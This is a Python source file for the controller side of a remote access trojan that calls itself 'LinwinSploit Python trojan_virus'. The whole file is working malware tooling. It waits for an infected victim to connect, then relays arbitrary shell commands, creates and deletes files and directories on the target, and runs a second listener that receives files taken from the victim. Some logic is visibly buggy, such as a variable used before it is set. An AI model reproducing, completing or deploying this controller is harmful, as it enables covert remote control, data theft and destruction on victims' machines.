import socket
import os
import sys
import threading
import random

HELP = """
|_LinwinSploit Python trojan_virus_|

1. shell                    Send shell command to target.
2. exit                     Exit from this attack.
3. getinfo                  Get information from target.
4. mkdir [dir path]         Make a new dictionary.
5. touch [file path]        Create a new File.
6. rmdir [dir path]         Delete the dir on the target host.
7. rmfile [file path]       Delete the file on the target host."""

print(" [INFO] WAIT FOR THE CLIENT CONNECT......")
tcpserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcpserver.bind(("", int(sys.argv[1])))
tcpserver.listen(1)

def file_server():
    file_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    file_server.bind(("",int(sys.argv[2])))
    file_server.listen(1)
    while True:
        conn, addr = file_server.accept()
        file_download = conn.makefile().read()
        file = os.environ['HOME']+"/download_file_"+str(random.random())
        with open(file,"w") as f:
            f.write(file_download)
        f.close()
        print("Successful Download: "+file)


file_server_thread = threading.Thread(target=file_server, name="file_server")
file_server_thread.start()

while True:
    conn, addr = tcpserver.accept()
    print(conn)
    print(" Enter 'help' to get help information.")
    while True:
        try:
            ret = conn.recv(1024)
            client_message = ret.decode("utf-8")
            print(client_message)
            command = input("LinwinSploit> ").strip()

            if command == 'exit':
                conn.send(command.encode())
                conn.close()
                tcpserver.close()
                
                exit(0)
            if command == 'help':
                conn.send("none".encode())
                print(HELP)
                continue
            if command == 'shell':
                print(" Enter 'exit' to exit")
                while True:
                    try:
                        shell_command = input("LinwinSploit [Shell] $ ")
                        if shell_command == 'exit':
                            break

                        conn.send(("shell: "+shell_command).encode())
                        data = conn.recv(1024)
                        print(data.decode("utf-8"))
                    except KeyboardInterrupt:
                        continue

            if command == '':
                conn.send("none".encode())

            if command.startswith("download"):
                conn.send(shell_command.encode())
            else:
                conn.send(command.encode())
                continue

        except Exception:
            break
    conn.close()